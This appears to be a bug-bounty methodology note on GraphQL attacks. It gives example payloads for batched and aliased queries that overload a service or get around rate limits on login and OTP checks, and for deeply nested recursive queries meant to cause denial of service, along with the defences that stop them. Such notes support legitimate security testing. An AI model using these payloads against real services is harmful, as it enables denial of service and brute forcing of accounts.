
## Batch Query Attacks

GraphQL supports Request Batching. Batched requests are processed one after the other by GraphQL, which makes it a good candidate for Denial of Service attacks, as well as other attacks such as Brute Force and Enumeration.
If a resource intensive GraphQL query is identified, an attacker may leverage batch processing to call the query and potentially overwhelm the service for a prolonged period of time.
```
query {
  t1:systemUpdate
  t2:systemUpdate
  t3:systemUpdate
  t4:systemUpdate
}
```
Or bypass rate limiting on Login, OTP...
```
query isValidDiscount($code: Int) {
    isvalidDiscount(code:$code){
        valid
    }
    isValidDiscount2:isValidDiscount(code:$code){
        valid
    }
    isValidDiscount3:isValidDiscount(code:$code){
        valid
    }
}
```
> [!NOTE]
> if Cost Query Analysis is enabled, it should prevent running batched queries.



## Denial of Service :: Deep Recursion Query Attack
If The application offers two types, which reference eachother (Type1 has Type2, and Type2 has Type1), it recursive query to be executed successfully.

![Example](https://github.com/0xGLSS/Bug-Bounty-Methodology/assets/85647797/cc9686ca-662c-4327-95c6-e2e47ceca255)

```
query {
  pastes {
    owner {
      pastes {
        owner {
          pastes {
            owner {
              pastes {
                owner {
                  pastes {
                    owner {
                      pastes {
                        owner {
                          name
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```
> [!NOTE]
> if a depth check is implemented it should prevent malicious queries from going through.

## (GraphQL CSRF)[https://portswigger.net/web-security/graphql#graphql-csrf]

6. 

## Ideas:
- Send same reset password token to 2 emails (similar to race condition) using GraphQL Batching attack

## Refrences
- [Bypassing rate limiting using Aliases](https://portswigger.net/web-security/graphql#bypassing-rate-limiting-using-aliases)
- [GraphQL Batching attack](https://lab.wallarm.com/graphql-batching-attack/)
